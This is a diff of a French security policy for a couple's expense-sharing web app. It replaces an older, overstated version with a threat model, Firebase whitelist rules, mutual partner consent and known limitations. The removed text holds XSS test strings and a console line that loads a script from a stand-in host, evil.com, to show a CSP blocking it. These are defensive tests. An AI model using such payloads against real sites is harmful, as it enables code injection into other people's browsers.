@@ -1,294 +1,156 @@
-# 🔐 Sécurité - Split-ChargeProrata
+# Sécurité — FairSplit
 
-> **Version** : 2.2.0-firebase-auth | **Date** : 2026-01-28
+> **Dernière révision** : 2026-08-19 · Correspond au code de la branche `main`.
 
----
-
-## 🛡️ Couches de Sécurité
-
-L'application implémente **plusieurs couches de sécurité** :
-
-1. ✅ **Authentification Firebase Multi-méthodes** - Google OAuth + Email/Mot de passe
-2. ✅ **Isolation des données par utilisateur** - Chaque compte accède uniquement à ses données
-3. ✅ **Content Security Policy (CSP)** - Bloque scripts/ressources malveillants
-4. ✅ **Protection XSS** - Échappement HTML de toutes entrées
-5. ✅ **Validation entrées** - Limites sur montants (max 100k€)
-6. ✅ **Stockage sécurisé** - Try/catch sur localStorage + Firebase writes avec error handling
-7. ✅ **Gestion d'état securisée** - Réinitialisation complète à la déconnexion
+Ce document décrit ce qui est **effectivement implémenté**. Toute affirmation
+ici doit être vérifiable dans le code ; à défaut, elle doit être retirée.
 
 ---
 
-## 🔐 Authentification Firebase (v2.2.0+)
+## Modèle de menace
 
-### Méthodes d'authentification disponibles
+Application de gestion de charges pour un couple, deux comptes autorisés,
+hébergée en statique sur GitHub Pages avec Firebase Realtime Database.
 
-L'application offre deux méthodes d'authentification via Firebase Auth :
+Les données sont des montants de charges domestiques et deux salaires nets.
+Pas de moyen de paiement, pas de données de santé, pas de tiers.
 
-1. Google OAuth (recommandé)
-   - Connexion via popup Google en un clic
-   - Pas de mot de passe à gérer
-   - Compte Google existant suffisant
+Ce qui compte, dans l'ordre :
 
-2. Email + Mot de passe
-   - Création de compte avec email et mot de passe
-   - Mot de passe minimum 6 caractères (contrôle Firebase)
-   - Utile si l'utilisateur préfère ne pas lier un compte Google
+1. Empêcher un accès externe aux données financières du foyer.
+2. Empêcher qu'un des deux comptes soit usurpé.
+3. Éviter qu'une donnée saisie puisse exécuter du code chez l'autre.
 
-### Comment ça fonctionne
-
-```javascript
-// Flux d'authentification
-1. Page de connexion affichée (authOverlay)
-2. Utilisateur choisit : Google OAuth ou Email/Password
-3. Firebase Auth émets un token UID unique
-4. onAuthStateChanged() détecte l'état authentifié
-5. Application se charge : données + interface
-6. Données stockées dans Firebase sous le chemin de l'utilisateur (UID)
-7. Déconnexion → réinitialisation d'état complète + retour authOverlay
-```
-
-### Régles Firebase (recommandées)
-
-```json
-{
-  "rules": {
-    ".read": "auth != null",
-    ".write": "auth != null"
-  }
-}
-```
-
-**Signification** :
-
-- `auth != null` : Utilisateur doit être authentifié avec un compte valide
-- Sans authentification → **Accès Firebase refusé**
-- Idéalement, les règles isoleraient les données par `auth.uid` pour une isolation par utilisateur complète
-
-### Avantages Sécurité
-
-**Authentification forte** :
-
-- ✅ Google OAuth : authentification via un fournisseur de confiance
-- ✅ Email/Password : gestion des comptes via Firebase Auth (hashing mot de passe côté serveur)
-- ✅ Pas de credentials stockés côté client
-
-**Isolation des données** :
-
-- ✅ Chaque utilisateur authentifié possède un UID unique
-- ✅ Les données sont associées à cet UID dans Realtime Database
-- ✅ Un utilisateur ne peut pas accéder aux données d'un autre
-
-**Gestion d'état securisée** :
-
-- ✅ `onAuthStateChanged()` est le point d'entrée unique de l'application
-- ✅ L'initialisation des données ne se déclenche qu'après authentification confirmée
-- ✅ Flag `appInitialized` empêche le double-chargement
-- ✅ À la déconnexion : réinitialisation complète (charges, salaires, données de recherche)
-
-**Compatible hors ligne** :
-
-- ✅ Si Firebase indisponible → Fallback localStorage
-- ✅ Application continue de fonctionner localement
-
-### Limites
-
-**Règles Firebase actuelles permissives** :
-
-- ⚠️ Les règles `.read/.write: "auth != null"` autorisent tout utilisateur authentifié
-- ⚠️ Pour une isolation totale, implémenter des règles basées sur `auth.uid`
-- Acceptable pour un usage restreint (couple, famille)
-
-**Protection limitée si HTML compromis** :
-
-- ⚠️ Si quelqu'un obtient le fichier HTML complet, il peut l'exécuter et s'authentifier
-- Toujours limité aux comptes créés/autorisés dans Firebase
+Hors périmètre : déni de service, analyse de trafic, compromission d'un
+terminal, sécurité physique.
 
 ---
 
-## Content Security Policy (CSP)
+## Couches effectivement en place
 
-Le fichier HTML intègre une **Content Security Policy** stricte pour protéger contre les injections de code malveillant.
+### 1. Authentification obligatoire
 
-### Version autonome (`Split-ChargeProrata.html`)
+Firebase Authentication, deux fournisseurs : Google et email/mot de passe.
+Aucune donnée n'est lisible sans jeton valide — vérifié côté serveur, pas
+seulement dans l'interface.
 
-```html
-<meta
-  http-equiv="Content-Security-Policy"
-  content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
-/>
-```
+### 2. Liste blanche d'adresses, appliquée côté serveur
 
-**Directives** :
+Les règles de [`database.rules.json`](database.rules.json) exigent que
+`auth.token.email` figure parmi les adresses autorisées. Un compte Google
+valide mais non listé est authentifié puis immédiatement rejeté.
 
-- `default-src 'none'` - Bloque toutes les ressources par défaut
-- `script-src 'unsafe-inline'` - Autorise uniquement les scripts inline (nécessaire pour single-file)
-- `style-src 'unsafe-inline'` - Autorise uniquement les styles inline (nécessaire pour single-file)
-- `img-src 'self' data:` - Autorise images locales et data URIs (pour SVG inline)
-- `font-src 'self'` - Autorise polices locales uniquement
-- `base-uri 'self'` - Empêche modification de la balise `<base>`
-- `form-action 'self'` - Empêche soumission de formulaires vers domaines externes
+La vérification est doublée côté client dans [`js/config.js`](js/config.js)
+(`ALLOWED_EMAILS`) et [`js/modules/auth.js`](js/modules/auth.js), qui déconnecte
+un compte non autorisé. **Cette seconde vérification est un confort d'interface,
+pas une protection** : seules les règles serveur font autorité.
 
-### Version modulaire (`Split-ChargeProrata-modular.html`)
+> Ajouter un utilisateur impose donc de modifier `ALLOWED_EMAILS` **et**
+> `database.rules.json`, puis de redéployer les règles (`npm run deploy:rules`).
 
-```html
-<meta
-  http-equiv="Content-Security-Policy"
-  content="default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
-/>
-```
+### 3. Cloisonnement par UID
 
-**Différences** :
+Chaque nœud est indexé par l'UID du propriétaire : `periods/{uid}`,
+`salaries/{uid}`, etc. Un utilisateur ne peut atteindre que sa propre branche.
 
-- `script-src 'self'` - Scripts externes autorisés (script.js)
-- `style-src 'self'` - Styles externes autorisés (styles.css)
-- ✅ **Plus sécurisé** car bloque complètement les scripts/styles inline
+### 4. Partage par consentement mutuel
 
-### Ce que la CSP bloque
+Le partage entre les deux comptes passe par `partners/{uid}`. L'accès aux
+données de A par B exige que **les deux pointeurs se répondent** :
+`partners/B === A` **et** `partners/A === B`.
 
-❌ **Bloqué par la CSP** :
+Chacun n'écrit que son propre pointeur — la règle d'écriture est restreinte à
+`auth.uid === $uid`. Se déclarer partenaire de quelqu'un ne donne donc aucun
+accès tant que l'intéressé n'a pas fait de même de son côté.
 
-- Chargement de scripts externes depuis CDN (ex: `<script src="https://cdn.example.com/malicious.js">`)
-- Injection de code JavaScript dans les attributs HTML (ex: `<img onerror="alert('XSS')">`)
-- Chargement de styles CSS malveillants depuis domaines externes
-- Redirection vers des sites externes via formulaires
-- Modification de l'URL de base du document
+Configuration : [`configure-partner.html`](configure-partner.html), à exécuter
+une fois par chaque personne avec l'UID de l'autre.
 
-✅ **Autorisé par la CSP** :
+### 5. Échappement des données affichées
 
-- Scripts et styles inline (version autonome) ou fichiers locaux (version modulaire)
-- Images locales et SVG inline (data URIs)
-- Sauvegarde dans localStorage (aucune connexion réseau)
+Toute donnée saisie et réinjectée en HTML passe par `escapeHtml()`
+([`js/utils/format.js`](js/utils/format.js)). Les champs concernés sont libres :
+description de charge, note, libellé de catégorie ou de destination
+personnalisée.
 
-## Protections XSS implémentées
+`eslint-plugin-no-unsanitized` signale tout nouvel `innerHTML` dynamique pour
+relecture (avertissement — voir [`eslint.config.mjs`](eslint.config.mjs) pour
+la justification de la sévérité).
 
-### 1. Échappement HTML (`escapeHtml()`)
+### 6. Intégrité des ressources externes
 
-Tous les contenus utilisateur sont échappés avant affichage :
+Firebase SDK et Leaflet sont chargés depuis un CDN avec attribut `integrity`
+(SRI) et `crossorigin`. Un CDN compromis ne peut pas substituer son code.
 
-```javascript
-function escapeHtml(unsafe) {
-  if (!unsafe) return '';
-  const div = document.createElement('div');
-  div.textContent = unsafe;
-  return div.innerHTML;
-}
-```
+### 7. Validation des saisies
 
-**Protection contre** :
-
-- `<script>alert('XSS')</script>` → `&lt;script&gt;alert('XSS')&lt;/script&gt;`
-- `<img src=x onerror=alert(1)>` → `&lt;img src=x onerror=alert(1)&gt;`
-
-### 2. Utilisation de `createElement()` au lieu de `innerHTML`
-
-La fonction `addCharge()` crée les éléments DOM via API sécurisée :
-
-```javascript
-const inputDesc = document.createElement('input');
-inputDesc.type = 'text';
-inputDesc.className = 'charge-desc';
-inputDesc.placeholder = 'ex: EDF';
-cellDesc.appendChild(inputDesc);
-```
-
-**Évite** : Injection via `innerHTML` avec contenu malveillant
-
-### 3. Validation stricte des entrées
-
-Tous les montants sont validés avec limites maximales :
-
-```javascript
-function validateAmount(value, fieldName, max = 100000) {
-  if (isNaN(value) || value === null || value === '') {
-    alert(`⚠️ ${fieldName} : valeur invalide`);
-    return false;
-  }
-  if (value < 0 || value > max) return false;
-  return true;
-}
-```
-
-**Limites** :
-
-- Salaires : 100 000 € maximum
-- Charges : 50 000 € maximum
-
-### 4. localStorage sécurisé
-
-Fonctions `safeSaveToLocalStorage()` et `safeLoadFromLocalStorage()` avec :
-
-- Try/catch pour gérer quota dépassé
-- Gestion mode navigation privée
-- Parsing JSON sécurisé avec fallback
-- Gestion des données corrompues
-
-## Audit de sécurité
-
-### ✅ Vulnérabilités corrigées
-
-| Vulnérabilité                | Statut     | Mitigation                                  |
-| ---------------------------- | ---------- | ------------------------------------------- |
-| XSS via innerHTML            | ✅ Corrigé | `createElement()` + `escapeHtml()`          |
-| XSS via attributs HTML       | ✅ Corrigé | CSP bloque inline event handlers            |
-| Injection script externe     | ✅ Corrigé | CSP `script-src` restrictif                 |
-| localStorage crash           | ✅ Corrigé | Try/catch avec fallback                     |
-| Valeurs absurdes             | ✅ Corrigé | Validation limites (100k€ / 50k€)           |
-| Données corrompues           | ✅ Corrigé | JSON.parse sécurisé                         |
-| Race condition auth/init     | ✅ Corrigé | Init dans `onAuthStateChanged` + flag       |
-| Firebase writes silencieux   | ✅ Corrigé | `.catch()` + toast sur toutes les requêtes  |
-| Fuite d'état entre comptes   | ✅ Corrigé | Réinitialisation complète à déconnexion     |
-| NaN dans formatCurrency      | ✅ Corrigé | Guard `isNaN()` → retour "0,00 €"           |
-
-### 🔒 Bonnes pratiques respectées
-
-- ✅ Authentification forte via Firebase Auth (Google OAuth + Email/Password)
-- ✅ Données isolées par utilisateur (UID Firebase)
-- ✅ Aucun tracking ou analytics
-- ✅ Pas de credentials en dur
-- ✅ Validation côté client complète
-- ✅ Firebase writes avec gestion d'erreurs (`.catch()` + toast)
-- ✅ Réinitialisation d'état à la déconnexion (privacy)
-- ✅ Code JavaScript documenté (JSDoc)
-- ✅ Principe du moindre privilège (CSP)
-
-## Tests de sécurité
-
-Pour tester la sécurité de l'application :
-
-### Test XSS basique
-
-1. Ajouter une charge avec description : `<script>alert('XSS')</script>`
-2. Calculer la répartition
-3. Vérifier l'historique
-
-**Résultat attendu** : Le script est échappé et affiché comme texte, pas exécuté.
-
-### Test CSP
-
-1. Ouvrir la console développeur (F12)
-2. Tenter d'exécuter : `var s = document.createElement('script'); s.src='https://evil.com/malicious.js'; document.body.appendChild(s);`
-
-**Résultat attendu** (version modulaire) :
-
-```text
-Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self'".
-```
-
-### Test localStorage
-
-1. Remplir le localStorage jusqu'à saturation (mode navigation privée ou quota atteint)
-2. Tenter de sauvegarder des données
-
-**Résultat attendu** : Notification "⚠️ Impossible de sauvegarder (stockage plein ou désactivé)" sans crash.
-
-## Signalement de vulnérabilité
-
-Si vous découvrez une vulnérabilité de sécurité, merci de :
-
-1. NE PAS la divulguer publiquement
-2. Contacter l'auteur : Richie Bigot-Scoarnec
-3. Fournir une description détaillée et un PoC (Proof of Concept) si possible
+[`js/utils/validation.js`](js/utils/validation.js) : bornes sur les montants
+(50 000 € par charge, 100 000 € par salaire), longueurs maximales, format de
+période. Ces contrôles préviennent les erreurs de saisie ; ils ne sont **pas**
+une frontière de sécurité, étant contournables côté client.
 
 ---
 
-**Dernière mise à jour** : 2026-01-28
+## Limites connues, assumées
+
+### Pas de Content Security Policy active
+
+Une CSP est définie dans [`firebase.json`](firebase.json), sous forme d'en-tête
+HTTP. **Elle ne s'applique pas** : le déploiement se fait sur GitHub Pages, qui
+ne permet pas de définir d'en-têtes de réponse. Elle ne prendrait effet que sur
+Firebase Hosting.
+
+Une balise `<meta http-equiv="Content-Security-Policy">` fonctionnerait sur
+GitHub Pages et reste une amélioration possible.
+
+### La clé API Firebase est publique — et ce n'est pas une fuite
+
+`FIREBASE_CONFIG` dans [`js/config.js`](js/config.js) est visible dans le
+JavaScript livré. C'est le fonctionnement normal de Firebase côté web : cette
+clé identifie le projet, elle n'autorise rien. La protection repose
+intégralement sur les règles de base de données.
+
+Corollaire : la confidentialité de l'URL Firebase **n'est pas** une mesure de
+sécurité. Toute documentation affirmant le contraire est fausse.
+
+### Un seul environnement
+
+Un seul projet Firebase. Pour développer sans toucher aux données réelles,
+utiliser l'émulateur :
+
+```bash
+npm run emulators
+```
+
+puis ouvrir `FairSplit.html?emulator=1`.
+
+### Suppression logique
+
+Les suppressions sont des `deleted: true`, jamais des effacements. Une donnée
+supprimée dans l'interface reste présente en base.
+
+### Vulnérabilités npm résiduelles
+
+`npm audit` signale 5 vulnérabilités modérées, toutes dans la chaîne de
+dépendances de `firebase-tools`, qui est une dépendance de développement et
+n'est jamais livrée au navigateur. `npm audit fix --force` n'est pas appliqué :
+il rétrograderait `firebase-tools` d'une version majeure.
+
+---
+
+## Règles de contribution
+
+- Jamais `".read": true` ni `".write": true` sur des données utilisateur, y
+  compris temporairement. Pour du développement sans contrainte : l'émulateur.
+- Jamais d'`innerHTML` avec une donnée utilisateur non passée par `escapeHtml()`.
+- Jamais de secret, jeton ou donnée personnelle dans le code ou les journaux.
+- Les règles vivent dans `database.rules.json` et nulle part ailleurs. Ne jamais
+  les éditer à la main dans la console Firebase : le prochain déploiement
+  écraserait la modification sans trace.
+- Toute action GitHub Actions doit être épinglée par SHA de commit.
+
+---
+
+## Signaler un problème
+
+Dépôt privé à usage familial : ouvrir une issue sur le dépôt.
